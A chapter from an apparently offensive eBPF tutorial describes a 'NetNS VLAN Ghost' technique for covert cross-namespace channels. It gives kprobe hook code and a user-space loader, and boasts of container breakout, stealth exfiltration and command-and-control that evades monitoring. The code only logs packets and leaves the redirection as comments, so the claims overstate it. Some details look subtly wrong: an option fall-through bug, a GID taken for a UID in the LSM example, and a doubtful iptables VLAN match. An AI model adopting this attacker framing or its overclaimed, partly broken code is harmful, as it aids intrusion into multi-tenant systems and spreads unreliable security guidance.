# NetNS VLAN Ghost: Invisible Cross-Namespace Network Tunneling

**Chapter 15: Haunting Multiple Network Realities**

You've gained control over CPU scheduling and time itself. Now let's return to networking, but with all the advanced knowledge you've gained. This isn't just about creating ghost interfaces—this is about existing in multiple network realities simultaneously.

This is where our story becomes about omnipresence. You've learned to exist in multiple process realities, but what about existing in multiple network realities? What if you could be in every network namespace at once?

Network namespaces are supposed to create completely isolated network stacks—each namespace gets its own interfaces, routing tables, firewall rules. It's like having separate network universes that can't see or talk to each other.

But what if we could create ghost interfaces that exist in multiple universes simultaneously? What if we could make network traffic appear in one namespace while actually originating from another? What if we could turn network isolation into network confusion?

We're going to create VLAN ghosts—network interfaces that haunt multiple namespaces, appearing and disappearing as needed. This is where you learn that eBPF doesn't just give you network access—it gives you the power to exist in all networks simultaneously.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Container A] -->|1. Send Packet| B[Network Stack]
    B -->|2. Process Packet| C[Network Driver]
    D[eBPF Program] -->|3. Hook & Intercept| C
    C -->|4. Modify VLAN Tags| E[Hidden Channel]
    E -->|5. Cross Namespace| F[Container B]
    G[Network Monitor] -->|6. Sees Nothing| H[False Security]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style G fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/networking/index.html" "Network Documentation"
    click C "https://www.kernel.org/doc/html/latest/networking/netdev-features.html" "Network Driver Features"
    click D "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
```



**Why Network Isolation Just Got Complicated**

Here's what makes container networking work: isolation. Each container gets its own network namespace, its own IP addresses, its own routing rules. The network stack ensures that containers can't see or interfere with each other's traffic.

But what happens when that isolation breaks down? What happens when network interfaces can exist in multiple namespaces simultaneously? What happens when VLAN tags can be manipulated to route traffic where it was never supposed to go?

That's where network namespace manipulation gets dangerous. We can bypass firewall rules by making traffic appear to come from trusted namespaces. We can establish covert channels between isolated containers. We can even access host network resources from supposedly isolated environments.

The insidious part is that this looks like normal network behavior. Network monitoring tools will see legitimate traffic patterns, firewall logs will show expected connections, but the actual network topology will be completely different from what everyone thinks it is.

## How We Ghost Through Network Boundaries

### Understanding Network Namespace Isolation

Network namespaces are like having separate network universes for each container:
- **Network interfaces**: Each namespace gets its own set of network cards (virtual ones)
- **Routing tables**: Separate GPS systems that decide where packets should go
- **Firewall rules**: Independent security guards for each namespace
- **Socket information**: Private network statistics that don't leak between namespaces

VLAN tagging is like having different colored envelopes for mail—the same physical wire can carry traffic for different virtual networks, and the kernel sorts them out by color.

```
┌─────────────────────────────────────────────────────────────┐
│                      Host System                            │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Container A   │      │ Container B   │                   │
│  │ Network NS 1  │      │ Network NS 2  │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼───────┐      ┌───────▼───────┐                   │
│  │ Virtual       │      │ Virtual       │                   │
│  │ Interface A   │      │ Interface B   │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Virtual Bridge              │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Physical Interface         │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we use eBPF to mess with network packet processing:

```
┌─────────────────────────────────────────────────────────────┐
│                      Host System                            │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Container A   │      │ Container B   │                   │
│  │ Network NS 1  │      │ Network NS 2  │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼───────┐      ┌───────▼───────┐                   │
│  │ Virtual       │      │ Virtual       │                   │
│  │ Interface A   │      │ Interface B   │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Virtual Bridge              │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌───────────────┐  │                                       │
│  │ eBPF Program  │◀─┘                                       │
│  │               │─┐                                        │
│  └───────────────┘ │                                        │
│                    │                                        │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Physical Interface         │                   │
│  └────────────────────────────────────────────────────────┘ │
│                     │                                       │
│                     ▼                                       │
│  ┌─────────────────────────────────────┐                    │
│  │     Covert Channel (Hidden)         │                    │
│  └─────────────────────────────────────┘                    │
└─────────────────────────────────────────────────────────────┘
```

### How We Ghost Through Network Walls

Our strategy is to manipulate network packets to slip between namespace boundaries:

1. **Hook the Packet Handlers**: We attach to functions like [`__netif_receive_skb_core()`](https://elixir.bootlin.com/linux/latest/source/net/core/dev.c) that process incoming packets
2. **Pick Our Targets**: We filter for packets from specific namespaces or containers that we want to mess with
3. **Play with VLAN Tags**: We add, modify, or strip VLAN tags to create covert communication channels
4. **Cross the Boundaries**: We redirect packets across namespace boundaries that should be isolated
5. **Stay Invisible**: We make sure monitoring tools only see the traffic patterns they expect

The beauty is that we're not breaking network isolation—we're just selectively making it permeable for our traffic.

### Building Our Network Ghost

```c
// @interactive: true
// @copyable: true
// NetNS VLAN Ghost - eBPF exploitation proof of concept
// This demonstrates creating covert channels between network namespaces

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_vlan.h>
#include <linux/pkt_cls.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_NAMESPACES 16
#define MAX_COMM_LEN 16
#define COVERT_VLAN_ID 4242  // VLAN ID used for covert channel
#define COVERT_PROTO 0x8942  // Custom ethertype for covert channel

// Structure to track packet events
struct packet_event {
    u32 pid;                // Process ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    u32 src_ns;             // Source network namespace
    u32 dst_ns;             // Destination network namespace
    u32 src_ip;             // Source IP
    u32 dst_ip;             // Destination IP
    u16 src_port;           // Source port
    u16 dst_port;           // Destination port
    u16 vlan_id;            // VLAN ID
    u16 protocol;           // Protocol
    u32 action;             // 1 = redirect, 2 = modify, 3 = drop
};

// Map to store network namespace information
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // Namespace ID as key
    __uint(value_size, sizeof(u32)); // Target namespace ID
    __uint(max_entries, MAX_NAMESPACES);
} namespace_map SEC(".maps");

// Map to store covert channel configuration
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 8);
} covert_config SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if a namespace is in our target list
static __always_inline bool is_target_namespace(u32 ns_id) {
    u32 *target = bpf_map_lookup_elem(&namespace_map, &ns_id);
    return target != NULL;
}

// Helper function to get the destination namespace for a source namespace
static __always_inline u32 get_destination_namespace(u32 src_ns) {
    u32 *dst_ns = bpf_map_lookup_elem(&namespace_map, &src_ns);
    if (dst_ns)
        return *dst_ns;
    return 0;
}

// Helper function to check if a packet is part of our covert channel
static __always_inline bool is_covert_packet(struct ethhdr *eth, u16 vlan_id) {
    // Check for our custom ethertype or VLAN ID
    if (eth->h_proto == bpf_htons(COVERT_PROTO))
        return true;
    
    if (vlan_id == COVERT_VLAN_ID)
        return true;
    
    // Check if covert channel is enabled
    u32 key = 0;
    u32 *enabled = bpf_map_lookup_elem(&covert_config, &key);
    if (!enabled || *enabled == 0)
        return false;
    
    // Additional checks could be implemented here
    // For example, specific source/destination IP patterns
    
    return false;
}

// Helper function to extract VLAN ID from a packet
static __always_inline u16 extract_vlan_id(struct sk_buff *skb) {
    // Check if this is a VLAN tagged packet
    u16 vlan_tci = 0;
    bpf_probe_read_kernel(&vlan_tci, sizeof(vlan_tci), &skb->vlan_tci);
    
    // Extract VLAN ID from TCI
    return vlan_tci & VLAN_VID_MASK;
}

// Hook the network packet receive function
SEC("kprobe/__netif_receive_skb_core")
int BPF_KPROBE(hook_receive_skb, struct sk_buff *skb)
{
    // Get network namespace information
    struct net *net;
    bpf_probe_read_kernel(&net, sizeof(net), &skb->dev->nd_net);
    
    // Get namespace ID
    u32 ns_id = 0;
    bpf_probe_read_kernel(&ns_id, sizeof(ns_id), &net->ns.inum);
    
    // Extract packet headers
    struct ethhdr eth;
    bpf_probe_read_kernel(&eth, sizeof(eth), skb->data);
    
    // Extract VLAN ID
    u16 vlan_id = extract_vlan_id(skb);
    
    // Check if this is a covert channel packet
    if (is_covert_packet(&eth, vlan_id)) {
        // Get destination namespace
        u32 dst_ns = get_destination_namespace(ns_id);
        if (dst_ns != 0) {
            // In a real exploit, we would now:
            // 1. Modify the packet's network namespace
            // 2. Adjust VLAN tags as needed
            // 3. Ensure the packet is delivered to the target namespace
            
            // For demonstration, we'll just log the event
            struct packet_event event = {};
            event.pid = bpf_get_current_pid_tgid() >> 32;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.timestamp = bpf_ktime_get_ns();
            event.src_ns = ns_id;
            event.dst_ns = dst_ns;
            event.vlan_id = vlan_id;
            event.protocol = bpf_ntohs(eth.h_proto);
            event.action = 1;  // redirect
            
            // Extract IP header if this is an IP packet
            if (eth.h_proto == bpf_htons(ETH_P_IP)) {
                struct iphdr iph;
                bpf_probe_read_kernel(&iph, sizeof(iph), skb->data + sizeof(eth));
                event.src_ip = iph.saddr;
                event.dst_ip = iph.daddr;
                
                // Extract port information for TCP/UDP
                if (iph.protocol == IPPROTO_TCP) {
                    struct tcphdr tcph;
                    bpf_probe_read_kernel(&tcph, sizeof(tcph), skb->data + sizeof(eth) + sizeof(iph));
                    event.src_port = bpf_ntohs(tcph.source);
                    event.dst_port = bpf_ntohs(tcph.dest);
                } else if (iph.protocol == IPPROTO_UDP) {
                    struct udphdr udph;
                    bpf_probe_read_kernel(&udph, sizeof(udph), skb->data + sizeof(eth) + sizeof(iph));
                    event.src_port = bpf_ntohs(udph.source);
                    event.dst_port = bpf_ntohs(udph.dest);
                }
            }
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        }
    }
    
    return 0;
}

// Hook the network packet transmit function
SEC("kprobe/dev_queue_xmit")
int BPF_KPROBE(hook_transmit, struct sk_buff *skb)
{
    // Get network namespace information
    struct net *net;
    bpf_probe_read_kernel(&net, sizeof(net), &skb->dev->nd_net);
    
    // Get namespace ID
    u32 ns_id = 0;
    bpf_probe_read_kernel(&ns_id, sizeof(ns_id), &net->ns.inum);
    
    // Check if this namespace is in our target list
    if (is_target_namespace(ns_id)) {
        // Extract packet headers
        struct ethhdr eth;
        bpf_probe_read_kernel(&eth, sizeof(eth), skb->data);
        
        // In a real exploit, we would now:
        // 1. Add or modify VLAN tags to create a covert channel
        // 2. Potentially modify the packet's content to include hidden data
        // 3. Ensure the packet can be received by the target namespace
        
        // For demonstration, we'll just log the event
        struct packet_event event = {};
        event.pid = bpf_get_current_pid_tgid() >> 32;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.src_ns = ns_id;
        event.dst_ns = get_destination_namespace(ns_id);
        event.protocol = bpf_ntohs(eth.h_proto);
        event.action = 2;  // modify
        
        // Extract IP header if this is an IP packet
        if (eth.h_proto == bpf_htons(ETH_P_IP)) {
            struct iphdr iph;
            bpf_probe_read_kernel(&iph, sizeof(iph), skb->data + sizeof(eth));
            event.src_ip = iph.saddr;
            event.dst_ip = iph.daddr;
            
            // Extract port information for TCP/UDP
            if (iph.protocol == IPPROTO_TCP) {
                struct tcphdr tcph;
                bpf_probe_read_kernel(&tcph, sizeof(tcph), skb->data + sizeof(eth) + sizeof(iph));
                event.src_port = bpf_ntohs(tcph.source);
                event.dst_port = bpf_ntohs(tcph.dest);
            } else if (iph.protocol == IPPROTO_UDP) {
                struct udphdr udph;
                bpf_probe_read_kernel(&udph, sizeof(udph), skb->data + sizeof(eth) + sizeof(iph));
                event.src_port = bpf_ntohs(udph.source);
                event.dst_port = bpf_ntohs(udph.dest);
            }
        }
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// TC program to intercept and modify packets at the traffic control layer
SEC("tc")
int tc_ingress(struct __sk_buff *skb)
{
    // This would be used in a more sophisticated implementation
    // to modify packets at the TC layer, which provides more
    // capabilities than kprobes
    
    return TC_ACT_OK;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the NetNS VLAN Ghost eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "netns_vlan_ghost.skel.h"

static volatile bool exiting = false;

// Structure for packet events (must match the BPF version)
struct packet_event {
    uint32_t pid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint32_t src_ns;
    uint32_t dst_ns;
    uint32_t src_ip;
    uint32_t dst_ip;
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t vlan_id;
    uint16_t protocol;
    uint32_t action;
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct packet_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    char src_ip[16], dst_ip[16];
    inet_ntop(AF_INET, &e->src_ip, src_ip, sizeof(src_ip));
    inet_ntop(AF_INET, &e->dst_ip, dst_ip, sizeof(dst_ip));
    
    printf("[%s] Process %d (%s): ", timestamp, e->pid, e->comm);
    
    const char *action_str = "Unknown";
    switch (e->action) {
        case 1:
            action_str = "Redirected";
            break;
        case 2:
            action_str = "Modified";
            break;
        case 3:
            action_str = "Dropped";
            break;
    }
    
    printf("%s packet from namespace %u to %u\n", action_str, e->src_ns, e->dst_ns);
    
    if (e->protocol == ETH_P_IP) {
        printf("  IP: %s:%u -> %s:%u\n", 
               src_ip, e->src_port, 
               dst_ip, e->dst_port);
    }
    
    if (e->vlan_id) {
        printf("  VLAN ID: %u\n", e->vlan_id);
    }
    
    printf("  Protocol: 0x%04x\n", e->protocol);
    printf("\n");
}

// Add a namespace mapping
void add_namespace_mapping(int map_fd, int src_ns, int dst_ns)
{
    uint32_t src_key = src_ns;
    uint32_t dst_value = dst_ns;
    
    if (bpf_map_update_elem(map_fd, &src_key, &dst_value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add namespace mapping: %s\n", strerror(errno));
    } else {
        printf("Added mapping: Namespace %d -> Namespace %d\n", src_ns, dst_ns);
    }
}

// Enable or disable the covert channel
void set_covert_channel(int map_fd, bool enabled)
{
    uint32_t key = 0;
    uint32_t value = enabled ? 1 : 0;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to set covert channel state: %s\n", strerror(errno));
    } else {
        printf("Covert channel %s\n", enabled ? "enabled" : "disabled");
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -m SRC:DST  Add namespace mapping (SRC -> DST)\n");
    printf("  -e          Enable covert channel\n");
    printf("  -d          Disable covert channel\n");
    printf("  -h          Show this help\n");
}

int main(int argc, char **argv)
{
    struct netns_vlan_ghost_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err, opt;
    bool enable_covert = false;
    bool disable_covert = false;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "m:edh")) != -1) {
        switch (opt) {
            case 'm':
            case 'e':
                enable_covert = true;
                break;
            case 'd':
                disable_covert = true;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = netns_vlan_ghost_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = netns_vlan_ghost_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Process command line arguments
    optind = 1;  // Reset getopt
    while ((opt = getopt(argc, argv, "m:edh")) != -1) {
        switch (opt) {
            case 'm': {
                int src_ns, dst_ns;
                if (sscanf(optarg, "%d:%d", &src_ns, &dst_ns) == 2) {
                    add_namespace_mapping(bpf_map__fd(skel->maps.namespace_map), src_ns, dst_ns);
                } else {
                    fprintf(stderr, "Invalid namespace mapping format. Use SRC:DST\n");
                }
                break;
            }
        }
    }
    
    // Set covert channel state
    if (enable_covert && !disable_covert) {
        set_covert_channel(bpf_map__fd(skel->maps.covert_config), true);
    } else if (disable_covert && !enable_covert) {
        set_covert_channel(bpf_map__fd(skel->maps.covert_config), false);
    }

    printf("NetNS VLAN Ghost eBPF program loaded and running.\n");
    printf("Monitoring for cross-namespace communication...\n");
    printf("Press Ctrl+C to exit.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    netns_vlan_ghost_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Multi-level Network Monitoring**:
   ```bash
   # Monitor at the physical interface level
   tcpdump -i eth0 -n
   
   # Monitor inside namespaces
   nsenter --net=/proc/[PID]/ns/net tcpdump -i eth0 -n
   
   # Use eBPF-based network monitoring
   bpftrace -e 'tracepoint:net:netif_receive_skb { printf("Packet received\n"); }'
   ```

4. **Implement Egress Filtering**:
   ```bash
   # Block unexpected VLAN tags
   iptables -A OUTPUT -p all -m vlan --vlan-tag 4242 -j DROP
   
   # Restrict outbound connections
   iptables -A OUTPUT -p tcp --dport 1234 -j DROP
   ```

### Why This Ghosts Through Everything

This network namespace VLAN ghost technique is pure network invisibility:
- **Container breakout**: Establish communication between supposedly isolated containers like they're best friends
- **Stealth data exfiltration**: Create covert channels to extract sensitive information without triggering network monitoring
- **Lateral movement mastery**: Pivot between compromised and target containers through invisible network tunnels
- **Command and control supremacy**: Maintain hidden communication with compromised systems that bypasses all network monitoring
- **Policy annihilation**: Circumvent network policies and security controls like they don't even exist

When you can create invisible cross-namespace communication channels, you've essentially broken the entire network isolation model. Cloud environments, Kubernetes clusters, multi-tenant systems - their fundamental security boundary becomes meaningless. You're operating in a parallel network dimension that their monitoring can't see.

### How They'll Try to Catch Us

Smart defenders will be hunting for our network ghosting:
- **eBPF surveillance**: Watching for eBPF programs hooking network-related functions
- **Traffic correlation analysis**: Looking for discrepancies in network traffic between different monitoring points
- **VLAN anomaly detection**: Monitoring unusual VLAN tag patterns or modifications
- **Cross-namespace monitoring**: Watching for unexpected communication between isolated namespaces
- **Interface-level analysis**: Looking for traffic that appears on physical interfaces but not in namespace monitoring

But here's the killer advantage - we're operating at the packet level below their namespace monitoring. By the time they see the traffic on physical interfaces, it's already bypassed all their isolation controls and policy enforcement.

## POC

Companion code: [`ch15-netns-vlan-ghost`]({{ site.baseurl }}/dBPF-pocs/pocs/ch15-netns-vlan-ghost/)